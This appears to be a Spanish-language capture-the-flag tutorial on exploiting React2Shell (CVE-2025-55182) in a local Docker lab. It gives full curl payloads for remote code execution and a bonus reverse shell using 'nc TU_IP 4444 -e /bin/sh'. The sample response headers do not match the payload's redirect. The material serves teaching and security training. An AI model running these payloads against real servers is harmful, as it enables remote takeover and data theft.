# 🚩 Guía del CTF: Explotando React2Shell (CVE-2025-55182)

Esta guía está diseñada para ayudarte a **entender** la vulnerabilidad, no solo a ejecutar un script. Vamos a desglosar el ataque en pasos lógicos.

---

## 🏗️ 1. Configuración y Reconocimiento

Inicia el objetivo del reto CTF (asegúrate de usar `--build` para instalar netcat):

```bash
cd ctf_challenge
docker-compose up --build
```

### 🕵️‍♂️ El Objetivo
Queremos lograr **Ejecución Remota de Código (RCE)** en el servidor.
La aplicación parece simple, pero procesa **Server Actions** utilizando un formato serializado (React Server Components).

---

## 🧩 2. Entendiendo la Inyección

Esta aplicación utiliza una versión vulnerable de una librería que permite **deserialización insegura** o comportamiento tipo **eval** al procesar formularios multipart específicos.

La vulnerabilidad reside en cómo el servidor maneja el campo `_response` en un payload JSON. Si podemos inyectar una propiedad `_prefix`, el servidor la **ejecutará** como código.

### La Estructura del Payload
Necesitamos construir una petición multipart con esta estructura JSON:

```json
{
  "_response": {
    "_prefix": "TU_CODIGO_NODEJS_MALICIOSO"
  }
}
```

---

## 🛠️ 3. Creando el Payload (Paso a Paso)

Usaremos `curl` para enviar esta petición.

> **💡 Sobre las Herramientas:**
> *   **¿Qué es `curl`?** Es una herramienta que nos permite "hablar" con servidores web directamente desde la línea de comandos, sin usar una interfaz gráfica como Chrome o Firefox.
> *   **¿Dónde lo ejecuto?** Tienes que abrir la terminal de tu sistema operativo (Terminal en Linux/Mac, o PowerShell/CMD en Windows). **NO** se ejecuta en la consola del navegador.
> *   **¿Tengo que instalar algo?** `curl` suele venir preinstalado. Puedes verificarlo escribiendo `curl --version` en tu terminal. Si ves una versión, ¡estás listo!

### Paso 3.1: El Comando Conceptualmente
 **¡No ejecutes esto en ninguna terminal!**
 Este es el código JavaScript que **enviaremos dentro** de nuestra petición `curl`. Lo analizamos aquí para entender qué hará el servidor cuando lo reciba.

 Queremos que el servidor ejecute un cálculo matemático simple: `1337 * 2`.
 El código que inyectaremos se ve así:

```javascript
/* ESTE CÓDIGO VA DENTRO DEL CURL (Payload) */
var output = process.mainModule.require('child_process').execSync('echo $((1337*2))').toString().trim();
```

### Paso 3.2: Exfiltrando el Resultado
Además de ejecutar el cálculo, necesitamos que el servidor nos **envíe el resultado de vuelta**.
Envolvemos el código anterior para "lanzar" un error que contenga nuestro resultado:

```javascript
throw Object.assign(new Error('NEXT_REDIRECT'), {
    digest: `NEXT_REDIRECT;push;/login?a=${output};307;`
});
```

---

## 🚀 4. Explotación

Ahora, juntémoslo todo en el comando `curl` final.

**⚠️ Reto:** ¡Intenta predecir qué contendrá la cabecera de respuesta `Location` antes de ejecutarlo!

Copia y ejecuta esto en tu terminal:

```bash
curl -i -X POST http://localhost:5555/ \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW" \
  -d $'------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name="0"\r\n\r\n{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\\"$B1337\\\"}","_response":{"_prefix":"var res=process.mainModule.require(\'child_process\').execSync(\'echo $((1337*2))\').toString().trim();;throw Object.assign(new Error(\'NEXT_REDIRECT\'),{digest:`NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name="2"\r\n\r\n[]\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n'
```

---

## 🏆 5. Análisis y Verificación

Mira la salida. Deberías ver un **303 See Other** o **307 Temporary Redirect**.
Revisa las cabeceras:

```http
X-Action-Redirect: /dashboard?session=2674&admin=true
Location: /dashboard?session=2674
```

### 🧠 Pensamiento Crítico
1.  **¿Qué es `2674`?** -> Es el resultado de `1337 * 2`.
2.  **¿Qué significa esto?** -> ¡El servidor ejecutó nuestra operación matemática!
3.  **¿Qué más podrías ejecutar?** -> `whoami`, `ls`, `cat /etc/passwd`...

**¡Felicidades! Has analizado y explotado React2Shell con éxito.** 🚩

---

## 🐚 6. Bonus: La Reverse Shell (Avanzado)

¿Quieres una terminal completa e interactiva? Dado que instalamos `netcat` en el contenedor (solo para ti 😉), consigamos una **Reverse Shell**.

### 1. Escucha en tu terminal
Abre una **nueva** ventana de terminal y ponte a la escucha en el puerto 4444:
```bash
nc -lvnp 4444
```

### 2. El Payload
Necesitamos decirle al servidor que se conecte de vuelta a tu ordenador.
**Importante**: Necesitas la IP de tu ordenador que sea accesible desde Docker (prueba `hostname -I` o mira tu configuración de red). Digamos que es `TU_IP`.

El código Javascript a inyectar es:
```javascript
require('child_process').exec('nc TU_IP 4444 -e /bin/sh');
```

### 3. Envía el Exploit
Para facilitarlo, aquí tienes el comando completo (reemplaza `TU_IP`):

```bash
curl -i -X POST http://localhost:5555/ \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW" \
  -d $'------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name="0"\r\n\r\n{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\\"$B1337\\\"}","_response":{"_prefix":"require(\'child_process\').exec(\'nc TU_IP 4444 -e /bin/sh\');","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name="2"\r\n\r\n[]\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n'
```

Si tienes éxito, revisa tu terminal donde estabas escuchando. ¡Deberías tener una shell!
Prueba escribir: `whoami` -> debería devolver `root` (o `node`).
